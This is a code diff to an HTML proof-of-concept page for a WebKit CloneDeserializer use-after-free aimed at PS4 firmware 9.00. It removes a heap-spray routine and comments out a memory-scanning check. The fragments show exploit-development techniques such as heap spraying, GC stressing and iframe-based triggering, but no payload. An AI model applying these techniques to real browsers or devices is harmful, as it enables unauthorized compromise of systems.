@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit CloneDeserializer UAF PoC (PS4 9.00 Exploit)</title>
+    <title>WebKit CloneDeserializer UAF PoC (PS4 9.00)</title>
     <style>
         #trigger {
             margin: 20px 0;
@@ -31,20 +31,6 @@
         const container = document.getElementById('container');
         const status = document.getElementById('status');
         let attemptCount = 0;
-
-        function sprayHeap() {
-            console.log('Spraying heap...');
-            const arrays = [];
-            for (let i = 0; i < 8000; i++) {
-                const buf = new Uint8Array(4096);
-                buf[0] = 0x42;
-                buf[1] = 0x43;
-                buf[2] = 0x00;
-                buf[3] = 0x00;
-                arrays.push(buf);
-            }
-            return arrays;
-        }
 
         function stressGC() {
             console.log('Stressing GC...');
@@ -90,21 +76,21 @@
                     }
 
                     stressGC();
-                    const arrays = sprayHeap();
+                    // const arrays = sprayHeap();
+                    // console.log('Scanning for UAF...');
+                    // for (let i = 0; i < arrays.length; i++) {
+                    //     if (arrays[i][0] !== 0x44 || arrays[i][1] !== 0x45 ||
+                    //         arrays[i][2] !== 0x46 || arrays[i][3] !== 0x47) {
+                    //         console.log(`UAF detected at index ${i}`);
+                    //         status.textContent = 'UAF detected!';
+                    //         return;
+                    //     }
+                    // }
 
-                    console.log('Scanning for UAF...');
-                    for (let i = 0; i < arrays.length; i++) {
-                        if (arrays[i][0] !== 0x42 || arrays[i][1] !== 0x43) {
-                            console.log(`UAF detected at index ${i}`);
-                            status.textContent = 'UAF detected!';
-                            return;
-                        }
-                    }
-
-                    console.log('Exploit completed.');
-                    status.textContent = 'Exploit attempted!';
+                    console.log('Exploit completed (no heap spray).');
+                    status.textContent = 'Exploit attempted (no heap spray)!';
                     container.removeChild(iframe);
-                }, 75);
+                }, 100);
             } catch (err) {
                 console.error(`Error: ${err.message}`);
                 status.textContent = 'Failed: Error occurred.';
